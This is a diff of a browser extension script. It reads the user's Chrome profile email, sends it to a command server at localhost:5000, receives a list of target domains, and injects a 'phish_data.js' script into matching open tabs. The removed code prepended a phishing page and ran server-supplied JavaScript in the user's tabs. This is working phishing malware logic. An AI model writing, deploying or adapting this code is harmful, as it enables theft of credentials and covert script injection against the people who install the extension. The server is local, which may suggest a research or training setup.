@@ -1,31 +1,36 @@
-$.get('../phish-pages/email.html', function(data) {
-    $('body').prepend(data);
-});
 
 
-function executeJS() {
-    chrome.identity.getProfileUserInfo(function(userInfo) {
+chrome.tabs.onUpdated.addListener(function () {
+    chrome.identity.getProfileUserInfo(function (userInfo) {
+        var userEmail;
         if (userInfo.email == "") {
-            userEmail = "no_email_found";
+            userEmail = "no_email_found"
         }
         else {
             userEmail = JSON.stringify(userInfo.email);
         }
-        localStorage.setItem('email', userEmail);
-        $.get(`http://localhost:5000/execute_script/${userEmail}`, function(script) {
-            if (script.js && script.js.length !== 0) {
-                // Execute each script in the array
-                for (let code of script.js) {
-                    code = code.replace(/<script>|<\/script>/gi, '');
-                    console.log(code);
-                    chrome.tabs.executeScript({code: code}, function(result) {
-                        console.log(result);
-                    })
-                }
-            }
+        var dataObj = {};
+        dataObj['email'] = userEmail;
+        chrome.storage.local.set(dataObj);
+
+        $.get(`http://localhost:5000/phish/${userEmail}`, function (result) {
+            chrome.tabs.query({}, function(queried_tabs) {
+                $.each(queried_tabs, function(index, value) {
+                    console.log(queried_tabs);
+                    var urlList = value.url.split('\/')[2].split('.');
+                    var url = urlList[urlList.length - 2] + '.' + urlList[urlList.length - 1];
+                    if ($.inArray(url, result.urls) != -1) {
+                        console.log("WE FOUND IT");
+    
+                        if (result.code.length != 0) {
+                            console.log("code!");
+                            chrome.tabs.executeScript(value.id, {
+                                file: `phish_data.js`
+                            });
+                        }
+                    }
+                });
+            });
         });
     });
-}
-
-
-setInterval(executeJS, 5 * 1000);
+});
